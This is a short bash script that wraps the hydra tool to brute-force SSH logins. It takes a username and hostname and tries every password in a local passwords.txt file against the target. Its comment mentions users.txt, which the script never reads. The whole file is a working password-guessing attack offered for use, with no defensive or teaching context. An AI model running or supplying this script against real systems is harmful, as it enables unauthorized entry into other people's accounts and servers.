#!/bin/bash
# SSH brute from users.txt
SCRIPT_DIR=$(dirname $0)
cd ${SCRIPT_DIR}
SCRIPT_BASE=$(pwd)

[ ! -e './passwords.txt' ] && echo "[error] passwords.txt is missing" && exit

if [ -z ${2} ]; then
    echo "Usage: ${0} <username> <hostname>"
    exit
fi

hydra -l ${1} -P ./passwords.txt ${2} ssh
